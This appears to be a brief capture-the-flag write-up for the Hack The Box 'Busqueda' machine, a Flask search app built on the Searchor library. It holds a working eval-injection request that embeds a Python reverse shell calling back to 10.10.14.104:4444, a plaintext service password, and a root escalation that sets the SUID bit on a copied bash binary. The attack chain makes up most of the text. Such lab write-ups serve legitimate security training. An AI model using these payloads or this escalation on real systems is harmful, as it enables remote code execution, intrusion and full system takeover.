## Busqueda


port 22 80 open



in 80 we can see a flask site with werkzeug 


we can search the exact query of every engine search


```
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://searcher.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Origin: http://searcher.htb
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

engine=Google&query=everything
```

response: 

```
HTTP/1.1 200 OK
Date: Wed, 12 Apr 2023 16:50:27 GMT
Server: Werkzeug/2.1.2 Python/3.10.6
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Connection: close
Content-Length: 34

https://www.google.com/search?q=ol
```


the program is https://github.com/ArjunSharda/Searchor


has different params


```python
@click.argument("engine")
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = Engine[engine].search(query, copy_url=copy, open_web=open)
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
        if copy:
            click.echo("link copied to clipboard")
    except AttributeError:
        print("engine not recognized")



```

https://realpython.com/python-eval-function/
https://stackoverflow.com/questions/2220699/whats-the-difference-between-eval-exec-and-compile

eval read only bytecode so 

**If a code object (which contains Python bytecode) is passed to exec or eval, they behave identically, excepting for the fact that exec ignores the return value, still returning None always. So it is possible use eval to execute something that has statements, if you just compiled it into bytecode before instead of passing it as a string:**


```
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://searcher.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 286
Origin: http://searcher.htb
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1

engine=Accuweather&query=ssss'%2beval(compile('import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.104",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("sh")','','exec'))%2b'
```




svc : jh1usoih2bkjaspwe92




```bash

cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```


so we can do sudo python3 scripts.py full-check(crafted) and boom we copy the bash with suid permssion and with /tmp/bash -p we are root






